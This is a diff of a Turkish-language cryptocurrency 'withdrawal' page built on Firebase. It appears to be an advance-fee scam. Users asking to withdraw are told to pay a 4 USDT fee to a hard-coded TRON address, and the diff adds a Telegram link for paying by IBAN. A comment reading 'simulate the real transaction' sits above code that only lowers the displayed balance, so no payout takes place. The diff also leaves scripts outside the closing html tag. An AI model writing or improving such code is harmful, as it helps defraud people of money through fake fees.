@@ -1,3 +1,4 @@
+<!-- PARA ÇEKME SAYFASI -->
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -5,21 +6,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Para Çekme</title>
   <style>
-    /* Body tüm sayfayı tam ortalar, yatay ve dikey */
     body {
       background: linear-gradient(to right, #181a29, #0f1120);
       color: #eee;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
-      height: 100vh; /* Tam yükseklik */
+      height: 100vh;
       display: flex;
-      justify-content: center; /* Yatay ortala */
-      align-items: center;     /* Dikey ortala */
+      justify-content: center;
+      align-items: center;
       padding: 20px;
       box-sizing: border-box;
     }
 
-    /* Kart kutucuğu */
     .card {
       background: #222436;
       padding: 30px 25px;
@@ -28,17 +27,15 @@
       max-width: 400px;
       width: 100%;
       box-sizing: border-box;
-      text-align: center; /* İçeriği ortala */
+      text-align: center;
     }
 
-    /* Başlık */
     h1 {
       color: #1abc9c;
       font-size: 28px;
       margin-bottom: 20px;
     }
 
-    /* Bakiye kutusu */
     .balance-box {
       font-size: 18px;
       background: #1e2033;
@@ -48,7 +45,6 @@
       word-wrap: break-word;
     }
 
-    /* Input ve butonlar */
     input, button {
       width: 100%;
       padding: 12px 15px;
@@ -65,9 +61,11 @@
       color: #fff;
       transition: background 0.3s ease;
     }
+
     input::placeholder {
       color: #bbb;
     }
+
     input:focus {
       outline: 2px solid #1abc9c;
       background: #2a2e47;
@@ -79,12 +77,12 @@
       cursor: pointer;
       transition: background 0.3s;
     }
+
     button:hover, button:focus {
       background: #16a085;
       outline: none;
     }
 
-    /* Mesaj alanı */
     #withdrawMessage {
       margin-top: 20px;
       font-weight: bold;
@@ -94,7 +92,6 @@
       color: #fff;
     }
 
-    /* Kopyala butonu */
     .copy-btn {
       margin-top: 10px;
       background: #444;
@@ -108,7 +105,6 @@
       display: inline-block;
     }
 
-    /* Destek butonu */
     .support-btn {
       margin-top: 25px;
       display: block;
@@ -123,12 +119,11 @@
       transition: background 0.3s;
       box-sizing: border-box;
     }
-    .support-btn:hover, .support-btn:focus {
+
+    .support-btn:hover {
       background: #4752c4;
-      outline: none;
     }
 
-    /* Responsive */
     @media (max-width: 480px) {
       body {
         padding: 10px;
@@ -136,7 +131,6 @@
 
       h1 {
         font-size: 24px;
-        margin-bottom: 15px;
       }
 
       .card {
@@ -146,18 +140,14 @@
       input, button {
         font-size: 15px;
         padding: 10px 12px;
-        margin: 8px 0;
       }
 
       .balance-box {
         font-size: 16px;
-        padding: 8px 12px;
-        margin-bottom: 15px;
       }
 
       #withdrawMessage {
         font-size: 14px;
-        min-height: auto;
       }
     }
   </style>
@@ -176,25 +166,9 @@
 
     <div id="withdrawMessage"></div>
 
-    <a href="https://t.me/rexfinans" target="_blank" class="support-btn" rel="noopener noreferrer" tabindex="0">📞 Destek Al</a>
+    <a href="https://t.me/rexfinans" target="_blank" class="support-btn" rel="noopener noreferrer">📞 Destek Al</a>
   </div>
 
-  <!-- Alt Menü Alanı -->
-  <div id="bottomMenu"></div>
-
-  <!-- Menü HTML'i Yükle -->
-  <script>
-    fetch("bottom-menu.html")
-      .then(res => res.text())
-      .then(html => {
-        document.getElementById("bottomMenu").innerHTML = html;
-      });
-  </script>
-
-  <!-- Menü.js -->
-  <script src="menü.js"></script>
-
-  <!-- Firebase ve İşlem Script -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
     import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
@@ -256,7 +230,10 @@
       }
 
       withdrawMessage.style.color = "#ffaa00";
-      withdrawMessage.innerHTML = `Lütfen 4 USDT işlem ücretini aşağıdaki adrese gönderin:\n<strong>TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH</strong>`;
+      withdrawMessage.innerHTML = `
+        Lütfen 4 USDT işlem ücretini aşağıdaki adrese gönderin:<br><strong>TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH</strong><br><br>
+        veya IBAN ile ödeme yapmak için aşağıdaki butona dokunun:
+      `;
 
       const copyBtn = document.createElement("button");
       copyBtn.textContent = "Adresi Kopyala";
@@ -267,6 +244,15 @@
       };
       withdrawMessage.appendChild(copyBtn);
 
+      const ibanBtn = document.createElement("a");
+      ibanBtn.href = "https://t.me/rexfinans";
+      ibanBtn.target = "_blank";
+      ibanBtn.textContent = "💳 IBAN ile Öde (Telegram)";
+      ibanBtn.className = "copy-btn";
+      ibanBtn.style.marginLeft = "10px";
+      withdrawMessage.appendChild(ibanBtn);
+
+      // Gerçek işlemi simüle et
       setTimeout(() => {
         balance -= (amount + 8);
         updateBalanceDisplay(balance);
@@ -281,6 +267,24 @@
     };
   </script>
 
+</body>
+</html>
+<!-- sayfa içeriğin buraya -->
+
+<!-- Alt Menü -->
+<div id="bottomMenu"></div>
+
+<!-- Menü HTML'ini yükle -->
+<script>
+  fetch("bottom-menu.html")
+    .then(res => res.text())
+    .then(html => {
+      document.getElementById("bottomMenu").innerHTML = html;
+    });
+</script>
+
+<!-- Menü.js en sonda -->
+<script src="menü.js"></script>
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
   import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
@@ -304,6 +308,7 @@
     }
   });
 </script>
+
 
 </body>
 </html>
